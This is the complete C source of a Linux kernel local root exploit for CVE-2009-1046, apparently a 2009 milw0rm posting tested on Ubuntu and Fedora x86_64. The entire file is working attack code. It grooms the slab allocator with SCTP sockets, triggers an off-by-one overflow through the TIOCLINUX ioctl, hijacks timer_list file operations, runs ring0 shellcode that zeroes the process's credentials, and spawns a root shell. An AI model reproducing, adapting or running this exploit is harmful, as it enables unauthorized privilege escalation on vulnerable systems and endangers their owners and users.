/* CVE-2009-1046 Virtual Console UTF-8  set_selection() off-by-one(two) Memory Corruption
 * Linux Kernel <= 2.6.28.3 
 *
 * coded by: sgrakkyu <at> antifork.org
 * http://kernelbof.blogspot.com/2009/07/even-when-one-byte-matters.html
 *
 * Dedicated to all people talking nonsense about non exploitability of kernel heap off-by-one overflow
 *
 * NOTE-1: you need a virtual console attached to the standard output (stdout) 
 * - physical login
 * - ptrace() against some process with the same uid already attached to a VC
 * - remote management ..
 *
 * NOTE-2: UTF-8 character used is: U+253C - it seems to be supported in most standard console fonts
 * but if it's _not_: change it (and change respectively STREAM_ZERO and STREAM_ZERO_ALT defines)
 * If you use an unsupported character expect some sort of recursive fatal ooops:)
 *
 * Designed to be built as x86-64 binary only (SLUB ONLY)
 * SCTP stack has to be available
 * 
 * Tested on target:
 * Ubuntu 8.04 x86_64 (2.6.24_16-23 generic/server)
 * Ubuntu 8.10 x86_64 (2.6.27_7-10 genric/server)
 * Fedora Core 10 x86_64 (default installed kernel - without selinux)
 *
 */


#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <linux/tiocl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>

#ifndef __x86_64__
#error "Architecture Unsupported"
#error "This code was written for x86-64 target and has to be built as x86-64 binary"
#else

#ifndef __u8
#define __u8  uint8_t
#endif
#ifndef __u16
#define __u16 uint16_t
#endif
#ifndef __u32
#define __u32 uint32_t
#endif
#ifndef __u64 
#define __u64 uint64_t
#endif


#define STREAM_ZERO 10
#define STREAM_ZERO_ALT 12

#define SCTP_STREAM 22
#define STACK_SIZE 0x1000
#define PAGE_SIZE 0x1000
#define STRUCT_PAGE  0x0000000000000000
#define STRUCT_PAGE_ALT 0x0000000100000000 
#define CODE_PAGE      0x0000000000010000
#define LOCALHOST "127.0.0.1"
#define KMALLOC "kmalloc-128"
#define TIMER_LIST_FOPS "timer_list_fops"

#define __msg_f(format, args...) \
  do { fprintf(stdout, format, ## args); } while(0)

#define __msg(msg) \
  do { fprintf(stdout, "%s", msg); } while(0)

#define __fatal_errno(msg) \
do { perror(msg); __free_stuff(); exit(1); } while(0)

#define __fatal(msg) \
do { fprintf(stderr, msg); __free_stuff(); exit(1); } while(0)



#define CJUMP_OFF 13
char ring0[]=
"\x57"                                      //    push   %rdi
"\x50"                                      //    push   %rax
"\x65\x48\x8b\x3c\x25\x00\x00\x00\x00"      //    mov    %gs:0x0,%rdi
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41"  //    mov   xxx, %rax
"\xff\xd0"                                  //    callq  *%rax
"\x58"                                      //    pop    %rax
"\x5f"                                      //    pop    %rdi
"\xc3";                                     //    retq


/* conn struct */
static __u16 srvport;
struct sockaddr_in server_s;
static struct sockaddr_in caddr;

/* some fds.. */
static int g_array[10];
static int fd_zmap_srv=-1;
static int kmalloc_fd=-1;
static int unsafe_fd[4] = {-1,-1,-1,-1}; 

/* misc */
static int dorec = 0, cankill=1, highpage=0;
static char cstack[STACK_SIZE*2];
static __u16 zstream=STREAM_ZERO;
static __u32 uid,gid;
static __u64 fops;
static pid_t child=0;
static char symbuf[20000];

static void __free_stuff()
{
  int i;
  for(i=3; i<2048; i++) 
  {
    if((unsafe_fd[0] == i || unsafe_fd[1] == i || 
       unsafe_fd[2] == i || unsafe_fd[3] == i))
        continue; 

    close(i);
  }
}

static void bindcpu()
{
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  
  if(sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0)
    __fatal_errno("setaffinity");
}

/* parse functions are not bof-free:) */
static __u64 get_fops_addr()
{
  FILE* stream;
  char fbuf[256];
  char addr[32];
  
  stream = fopen("/proc/kallsyms", "r");
  if(stream < 0)
    __fatal_errno("open: kallsyms");

  memset(fbuf, 0x00, sizeof(fbuf));
  while(fgets(fbuf, 256, stream) > 0)
  {
    char *p = fbuf;
    char *a = addr;
    memset(addr, 0x00, sizeof(addr));
    fbuf[strlen(fbuf)-1] = 0;
    while(*p != ' ')
      *a++ = *p++;  
    p += 3;
    if(!strcmp(p, TIMER_LIST_FOPS))
      return strtoul(addr, NULL, 16); 
  }

  return 0;
}

static int get_total_object(int fd)
{
  char name[32];
  char used[32];
  char total[32];
  char *ptr[] = {name, used, total};
  int ret,i,toread=sizeof(symbuf)-1;
  char *p = symbuf;

  lseek(fd, 0, SEEK_SET);
  memset(symbuf, 0x00, sizeof(symbuf));
  while( (ret = read(fd, p, toread)) > 0)
  {
    p += ret; 
    toread -= ret;
  }

  p = symbuf;
  do
  {
    for(i=0; i<sizeof(ptr)/sizeof(void*); i++)
    {
      char *d = ptr[i];
      while(*p != ' ')
        *d++ = *p++;   
      *d = 0;
      while(*p == ' ')
        p++;
    }
    
    while(*p++ != '\n');
  
    if(!strcmp(KMALLOC, name))
      return atoi(total);  

  } while(*p != 0);
  return 0;
}


static void ring0c(void* t)
{
  int i;
  __u32 *p = t;
  for(i=0; i<1100; i++,p++)
  {
      if(p[0] == uid && p[1] == uid && p[2] == uid && p[3] == uid &&
         p[4] == gid && p[5] == gid && p[6] == gid && p[7] == gid)
         {
           p[0] = p[1] = p[2] = p[3] = 0;
           p[4] = p[5] = p[6] = p[7] = 0;
           /* dont care about caps */
           break;
         }
  }
}


static int get_kmalloc_fd()
{
  int fd;
  fd = open("/proc/slabinfo", O_RDONLY);
  if(fd < 0)
    __fatal_errno("open: slabinfo");
  return fd;
}


static int write_sctp(int fd, struct sockaddr_in *s, int channel)
{
  int ret;
  ret = sctp_sendmsg(fd, "a", 1,
               (struct sockaddr *)s, sizeof(struct sockaddr_in),
               0, 0, channel, 0 ,0);
  return ret;
}


static void set_sctp_sock_opt(int fd, __u16 in, __u16 out)
{
  struct sctp_initmsg msg;
  int val=1;
  socklen_t len_sctp = sizeof(struct sctp_initmsg);
  getsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, &len_sctp);
  msg.sinit_num_ostreams=out; 
  msg.sinit_max_instreams=in;
  setsockopt(fd, SOL_SCTP, SCTP_INITMSG, &msg, len_sctp);
  setsockopt(fd, SOL_SCTP, SCTP_NODELAY, (char*)&val, sizeof(val));
}


static int create_and_init(void)
{
  int fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
  if(fd < 0)
    __fatal_errno("socket: sctp");
  set_sctp_sock_opt(fd, SCTP_STREAM, SCTP_STREAM);
  return fd;
}


static void connect_peer(int fd, struct sockaddr_in *s)
{ 
  int ret;
  ret = connect(fd, (struct sockaddr *)s, sizeof(struct sockaddr_in));
  if(ret < 0)
    __fatal_errno("connect: one peer");
}


static void conn_and_write(int fd, struct sockaddr_in *s, __u16 stream)
{
  connect_peer(fd,s);
  write_sctp(fd, s, stream);
}


static int clone_thread(void*useless)
{
  int o = 1;
  int c=0,idx=0;
  int fd, ret;
  struct sockaddr_in tmp;
  socklen_t len;

  bindcpu();
  server_s.sin_family = PF_INET;
  server_s.sin_port = htons(srvport); 
  server_s.sin_addr.s_addr = inet_addr(LOCALHOST);

  fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
  if(fd < 0)
    return -1;

  set_sctp_sock_opt(fd, SCTP_STREAM, SCTP_STREAM);   
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o));

  ret = bind(fd, (struct sockaddr *)&server_s, sizeof(struct sockaddr_in));
  if(ret < 0)
    return -1;

  ret = listen(fd, 100);
  if(ret < 0)
    return -1;

  len = sizeof(struct sockaddr_in);
  while((ret = accept(fd, (struct sockaddr *)&tmp, &len)) >= 0)
  {
    if(dorec != 0 && c >= dorec && idx < 10)
    {
      g_array[idx] = ret;
      if(idx==9)
      {
        fd_zmap_srv = ret;
        caddr = tmp;
        break;
      }
      idx++;
    }
    c++;   
    write_sctp(ret, &tmp, zstream);
  }
  
  sleep(1);
  return 0; 
}


static int do_mmap(unsigned long base, int npages)
{
  void*addr = mmap((void*)base, PAGE_SIZE*npages,
                   PROT_READ|PROT_WRITE|PROT_EXEC,  
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

  if(MAP_FAILED == addr)
    return -1;

  memset(addr, 0x00, PAGE_SIZE*npages);
  
  return 0;
}

pid_t start_listener()
{
  pid_t pid;
  pid = clone(clone_thread, cstack+STACK_SIZE-8, 
              CLONE_VM|CLONE_FILES|SIGCHLD, NULL);
  
  return pid;
} 

static void do_socks(struct sockaddr_in *s, __u16 stream)
{
  int i,fd;
  int n_objs = get_total_object(kmalloc_fd), tmp_n_objs;
  int next=8;

  for(i=0; next != 0; i++)
  {
    fd = create_and_init();

    tmp_n_objs = get_total_object(kmalloc_fd); 
    if(!dorec && tmp_n_objs != n_objs)
      dorec=i; 

    conn_and_write(fd, s, stream);
    if(dorec)
      next--;
  }
}


static void clr(int fd)
{
  /* use termcap instead..*/
  write(fd, "\33[H\33[J", 6);  
}

static char tiobuffer[2048];
void alloc_tioclinux()
{
  int i;
  char out[128*3];
  /* Unicode Character 'BOX DRAWINGS LIGHT VERTICAL AND HORIZONTAL' (U+253C) */
  char utf8[3] = { 0xE2, 0x94, 0xBC };  
  //char utf8[3] = { 0xE2, 0x80, 0xBC };  
  struct tiocl_selection *sel;
  char *t;
  void *v = malloc(sizeof(struct tiocl_selection) + 1);
  t = (char*)v; 
  sel = (struct tiocl_selection *)(t+1);
  memset(out, 0x41, sizeof(out)); 
  for(i=0; i<128; i++) 
  {
    tiobuffer[(i*3)]=utf8[0];
    tiobuffer[(i*3)+1]=utf8[1];
    tiobuffer[(i*3)+2]=utf8[2];
  }

  *t = TIOCL_SETSEL;
  sel->xs = 1;
  sel->ys = 1;
  sel->xe = 43;
  //sel->xe = 42; /* no overflow */
  sel->ye = 1;
  
  write(1, tiobuffer, sizeof(tiobuffer));
  if(ioctl(1, TIOCLINUX, v) < 0)
    __fatal("[!!] Unable to call TIOCLINUX ioctl(), need stdout to be on a virtual console\n");
}



static void migrate_evil_fd()
{
  int i;
  pid_t child;

  __msg("[**] Migrate evil unsafe fds to child process..\n");
  child = fork();
  if(!child)
  {

    /* preserve evil fds */
    setsid(); 
    if(!cankill) /* cant die .. */
      while(1)
        sleep(1);
    else
    {
      sleep(10); /* wait execve() before */ 
      for(i=0; i<4; i++)
        close(unsafe_fd[i]); 

      exit(1);
    }
  }
  else
  {
    if(!cankill)
      __msg_f("[**] Child process %d _MUST_ NOT die ... keep it alive:)\n", child);
  }
}


static void trigger_fault()
{
  char *argv[]={"/bin/sh", NULL};
  int fd,i;

  fd = open("/proc/timer_list", O_RDONLY);
  if(fd >= 0)
  {
    ioctl(fd, 0, 0);
    __free_stuff();
    migrate_evil_fd();
    
    for(i=0; i<4; i++)
      close(unsafe_fd[i]);

    if(!getuid())
    {
      __msg("[**] Got root!\n");
      execve("/bin/sh", argv, NULL); 
    }
  }
  else
  {
    __msg("[**] Cannot open /proc/timer_list");
    __free_stuff();
  }
}



static void overwrite_fops( int sender, 
                            struct sockaddr_in *to_receiver,
                            int receiver)
{
  char *p = NULL;
  if(!highpage)
    p++;
  else
    p = (void*)STRUCT_PAGE_ALT;

  __u64 *uip = (__u64*)p;  
  *uip = fops;
  write_sctp(sender, to_receiver, 1);  
  sleep(1);
  trigger_fault();
}

static __u16 get_port()
{
  __u16 r = (__u16)getpid();
  if(r <= 0x400)
    r+=0x400;
  return r;
}

int main(int argc, char *argv[])
{
  int peerx, peery,i;
  __u64 *patch;

  srvport = get_port();

  uid=getuid();
  gid=getgid();
  fops=get_fops_addr() + 64; 
  if(!fops)
  {
    __msg("[!!] Unable to locate symbols...\n");
    return 1;
  }

  __msg_f("[**] Patching ring0 shellcode with userspace addr: %p\n", ring0c);
  patch = (__u64*)(ring0 + CJUMP_OFF);
  *patch = (__u64)ring0c;

  __msg_f("[**] Using port: %d\n", srvport);
  __msg("[**] Getting slab info...\n");
  kmalloc_fd = get_kmalloc_fd();
  if(!get_total_object(kmalloc_fd)) 
    __fatal("[!!] Only SLUB allocator supported\n");
 

  __msg("[**] Mapping Segments...\n"); 
  __msg("[**] Trying mapping safe page...");
  if(do_mmap(STRUCT_PAGE, 1) < 0)
  {
    __msg("Page Protection Present (Unable to Map Safe Page)\n");
    __msg("[**] Mapping High Address Page (dont kill placeholder child)\n");
    if(do_mmap(STRUCT_PAGE_ALT, 1) < 0)
      __fatal_errno("mmap"); 

    cankill=0;  /* dont kill child owning unsafe fds.. */
    highpage=1; /* ssnmap in higher pages */
    zstream=STREAM_ZERO_ALT; 
  } 
  else
    __msg("Done\n");

  __msg("[**] Mapping Code Page... ");
  if(do_mmap(CODE_PAGE, 1) < 0)
    __fatal_errno("mmap");
  else
    __msg("Done\n");

  memcpy((void*)CODE_PAGE, ring0, sizeof(ring0));

  __msg("[**] Binding on CPU 0\n"); 
  bindcpu(); 

  __msg("[**] Start Server Thread..\n");
  child = start_listener();
  sleep(3); 
  
  do_socks(&server_s, zstream);
  for(i=0; i<7; i++)
  {
    close(g_array[8-1-i]);  
  }
  clr(1); 
  alloc_tioclinux(); // trigger overflow
  peerx = create_and_init();
  connect_peer(peerx, &server_s);
  peery = create_and_init();
  connect_peer(peery, &server_s);
  
  sleep(1);

  unsafe_fd[0] = peerx;
  unsafe_fd[1] = g_array[8];
  unsafe_fd[2] = peery;
  unsafe_fd[3] = g_array[9];
 
  __msg("\n"); 
  __msg_f("[**] Umapped end-to-end fd: %d\n", fd_zmap_srv); 
  __msg_f("[**] Unsafe  fd: ( ");

  for(i=0; i<4; i++)
    __msg_f("%d ", unsafe_fd[i]);
  __msg(")\n"); 
  

  __msg("[**] Hijacking fops...\n");
  overwrite_fops(fd_zmap_srv, &caddr, peery);

  /* if u get here.. something nasty happens...may crash..*/
  __free_stuff();
  __msg("[**] Exploit failed.. freezing process\n");
  kill(getpid(), SIGSTOP);
  return 0;
}

#endif

// milw0rm.com [2009-07-09]
